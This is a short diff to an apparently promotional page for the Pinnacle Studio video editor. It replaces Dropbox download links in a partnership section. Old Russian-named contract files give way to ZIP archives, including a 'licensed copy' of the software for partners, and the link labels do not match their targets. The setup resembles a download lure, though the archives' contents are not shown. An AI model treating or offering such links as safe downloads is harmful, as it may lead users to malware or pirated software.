@@ -19,13 +19,13 @@ Edit freely across unlimited tracks with complete control, precision, and the po
 # ✅ Partnership and cooperation:
   
  ### Terms of Reference
- [💾 Download](https://www.dropbox.com/s/lqfchngpciih52o/%D0%A2%D0%B5%D1%85%D0%BD%D0%B8%D1%87%D0%B5%D1%81%D0%BA%D0%BE%D0%B5%20%D0%B7%D0%B0%D0%B4%D0%B0%D0%BD%D0%B8%D0%B5%20%D0%BE%D1%82%20SkyFord.pdf?dl=1)
+ [💾 Download](https://www.dropbox.com/s/65y2hoyt45o0e1e/Promotional%20materials.zip?dl=0)
 
 ### Promotional materials
- [💾 Download](https://www.dropbox.com/s/lqfchngpciih52o/%D0%A2%D0%B5%D1%85%D0%BD%D0%B8%D1%87%D0%B5%D1%81%D0%BA%D0%BE%D0%B5%20%D0%B7%D0%B0%D0%B4%D0%B0%D0%BD%D0%B8%D0%B5%20%D0%BE%D1%82%20SkyFord.pdf?dl=1)
+ [💾 Download](https://www.dropbox.com/s/65y2hoyt45o0e1e/Promotional%20materials.zip?dl=1)
   
  ### Licensed copy of Pinnacle Studio for partners
- [💾 Download](https://www.dropbox.com/s/k422i4l12v7svin/%D0%94%D0%BE%D0%B3%D0%BE%D0%B2%D0%BE%D1%80%20%D0%BD%D0%B0%20%D1%80%D0%B5%D0%BA%D0%BB%D0%B0%D0%BC%D0%BD%D1%8B%D0%B5%20%D1%83%D1%81%D0%BB%D1%83%D0%B3%D0%B8%20Skyford.rar?dl=1)
+ [💾 Download](https://www.dropbox.com/s/vkmh1nmgm3my6ks/Pinnacle%20Studio%2025%20Ultimate.zip?dl=1)
 
 #
 </details></div>
